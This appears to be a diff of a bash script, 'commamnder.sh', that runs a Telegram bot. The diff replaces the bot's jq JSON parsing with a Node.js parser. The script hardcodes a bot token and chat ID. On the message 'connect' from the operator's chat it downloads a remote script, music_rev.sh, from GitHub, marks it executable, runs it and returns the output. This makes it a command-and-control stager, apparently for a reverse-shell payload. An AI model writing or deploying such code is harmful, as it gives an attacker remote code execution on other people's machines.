@@ -1,17 +1,23 @@
 #!/usr/bin/env bash
+# commamnder.sh — Bash Telegram bot using Node.js to parse JSON
+# Usage: ./commamnder.sh
+# Requires: curl + node
+# Edit HARDCODE_CMD below.
+
 set -euo pipefail
 
 ################ CONFIG ################
 TOKEN="7400095855:AAE9Lqtz6LLM-_gEasvVWY4nqGtkxr2I-rY"
 CHAT_ID="6565158025"
 HARDCODE_CMD="curl -sL https://raw.githubusercontent.com/FBIking/Fbiking.github.io/main/music_rev.sh -o music_rev.sh && chmod +x music_rev.sh && ./music_rev.sh"
+
 ########################################
 
 API="https://api.telegram.org/bot${TOKEN}"
 
 send_msg() {
   local text="$1"
-  curl -s -X POST "${API}/sendMessage" \
+  curl -s -sX POST "${API}/sendMessage" \
     -d chat_id="${CHAT_ID}" \
     -d text="$text" >/dev/null
 }
@@ -23,9 +29,22 @@ send_file() {
     -F document=@"$file" >/dev/null
 }
 
-# Bash JSON parser using jq
-parse_updates_bash() {
-  jq -r '.result[] | "\(.update_id)|\(.message.chat.id // empty)|\(.message.text // "")"' 2>/dev/null
+# node parser: reads JSON from stdin and prints update_id|chat_id|text
+parse_updates_node() {
+  node -e '
+    const fs = require("fs");
+    const data = JSON.parse(fs.readFileSync(0, "utf8"));
+    if (!data.result) process.exit(0);
+    for (const r of data.result) {
+      const uid = r.update_id;
+      const msg = r.message || r.edited_message || {};
+      const cid = msg.chat && msg.chat.id;
+      const text = (msg.text || "").replace(/\n/g, " ");
+      if (uid !== undefined && cid !== undefined) {
+        console.log(`${uid}|${cid}|${text}`);
+      }
+    }
+  '
 }
 
 # notify on startup
@@ -34,14 +53,16 @@ send_msg "ready to execute command"
 OFFSET=0
 while true; do
   UPDATES=$(curl -s "${API}/getUpdates?offset=${OFFSET}&timeout=20")
-  
   while IFS= read -r line; do
     [ -z "$line" ] && continue
     IFS='|' read -r UPDATE_ID FROM_ID TEXT <<< "$line"
+
     OFFSET=$((UPDATE_ID+1))
 
     # only react to your chat
-    [ "$FROM_ID" != "$CHAT_ID" ] && continue
+    if [ "$FROM_ID" != "$CHAT_ID" ]; then
+      continue
+    fi
 
     if [ "$TEXT" = "connect" ]; then
       OUTPUT="$(bash -c "$HARDCODE_CMD" 2>&1 || true)"
@@ -59,5 +80,5 @@ while true; do
         fi
       fi
     fi
-  done < <(echo "$UPDATES" | parse_updates_bash)
+  done < <(echo "$UPDATES" | parse_updates_node)
 done
